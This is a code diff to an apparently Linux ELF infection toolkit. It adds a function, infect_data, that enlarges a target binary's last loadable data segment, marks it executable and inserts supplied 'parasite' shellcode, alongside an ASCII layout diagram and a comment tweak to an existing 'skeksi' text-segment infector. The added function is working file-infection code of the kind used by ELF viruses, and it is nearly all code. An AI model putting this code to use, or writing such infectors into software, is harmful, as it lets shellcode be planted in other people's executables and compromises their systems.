@@ -265,7 +265,7 @@ The address of the load segment in memory cannot be easily changed
 /**
  * @brief 使用skeksi增强版感染算法，填充text段. 此算法适用于开启pie的二进制
  * use the Skeksi plus infection algorithm to fill in text segments
- * this algorithm is suitable for opening binary pies
+ * this algorithm is suitable for opening binary pie
  * @param elfname elf file name
  * @param parasite shellcode
  * @param size shellcode size (< 1KB)
@@ -508,4 +508,134 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
     free(parasite_expand);
 
     return parasite_addr;
+}
+
+/*
+                                                             
+      memory layout                  file layout             
+                                                             
+  ─── ┌──────────────┐ 0x0000    ─── ┌──────────────┐ 0x0000 
+  ▲   │  ehdr/phdr   │           ▲   │  ehdr/phdrr  │        
+  │   ├──────────────┤ 0x1000    │   ├──────────────┤ 0x1000 
+  │   │     TEXT     │           │   │     TEXT     │        
+  │   ├──────────────┤           │   ├──────────────┤        
+  │   │              │           │   │              │        
+ const│              │          const│              │        
+  │   │              │           │   │              │        
+  │   │              │           │   │              │        
+  │   │              │           │   │              │        
+  │   ├──────────────┤           │   ├──────────────┤        
+  ▼   │     data     │           ▼   │     data     │        
+  ─── ├──────────────┤           ─── ├──────────────┤        
+      │xxxxxxxxxxxxxx│               │xxxxxxxxxxxxxx│        
+      └──────────────┘               ├──────────────┤        
+                                     │     shdr     │        
+                                     └──────────────┘        
+*/
+
+/**
+ * @brief 填充text段感染
+ * fill in data segments infection algorithm
+ * @param elfname elf file name
+ * @param parasite shellcode
+ * @param size shellcode size (< 1KB)
+ * @return uint64_t parasite address {-1:error,0:false,address}
+ */
+uint64_t infect_data(char *elfname, char *parasite, size_t size) {
+    int fd;
+    struct stat st;
+    uint8_t *mapped;
+    int data_index;
+    uint64_t origin_data_offset;
+
+    uint64_t vstart, vend;
+    get_segment_range(elfname, PT_LOAD, &vstart, &vend);
+
+    fd = open(elfname, O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return -1;
+    }
+
+    if (fstat(fd, &st) < 0) {
+        perror("fstat");
+        return -1;
+    }
+
+    mapped = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (mapped == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+
+    if (MODE == ELFCLASS32) {
+        Elf32_Ehdr *ehdr;
+        Elf32_Phdr *phdr;
+        Elf32_Shdr *shdr;
+        ehdr = (Elf32_Ehdr *)mapped;
+        phdr = (Elf32_Phdr *)&mapped[ehdr->e_phoff];
+        shdr = (Elf32_Shdr *)&mapped[ehdr->e_shoff];
+
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_vaddr + phdr[i].p_memsz == vend && phdr[i].p_type == PT_LOAD) {
+                data_index = i;
+                origin_data_offset = phdr[i].p_offset + phdr[i].p_filesz;
+                phdr[i].p_memsz += size;
+                phdr[i].p_filesz += size;
+                phdr[i].p_flags |= PF_X;
+                VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
+                break;
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_addr + shdr[i].sh_size == vend) {
+                shdr[i].sh_size += size;
+            }
+        }
+
+        ehdr->e_shoff += size;
+    }
+
+    else if (MODE == ELFCLASS64) {
+        Elf64_Ehdr *ehdr;
+        Elf64_Phdr *phdr;
+        Elf64_Shdr *shdr;
+        ehdr = (Elf64_Ehdr *)mapped;
+        phdr = (Elf64_Phdr *)&mapped[ehdr->e_phoff];
+        shdr = (Elf64_Shdr *)&mapped[ehdr->e_shoff];
+
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_vaddr + phdr[i].p_memsz == vend && phdr[i].p_type == PT_LOAD) {
+                data_index = i;
+                origin_data_offset = phdr[i].p_offset + phdr[i].p_filesz;
+                phdr[i].p_memsz += size;
+                phdr[i].p_filesz += size;
+                phdr[i].p_flags |= PF_X;
+                VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
+                break;
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_addr + shdr[i].sh_size == vend) {
+                shdr[i].sh_size += size;
+            }
+        }
+
+        ehdr->e_shoff += size;
+    }
+
+    close(fd);
+    munmap(mapped, st.st_size);
+
+    // insert parasite code
+    int ret = insert_data(elfname, origin_data_offset, parasite, size);
+    if (ret == 0) {
+        VERBOSE("insert successfully\n");
+    } else {
+        VERBOSE("insert failed\n");
+    }
+
+    return vend;
 }
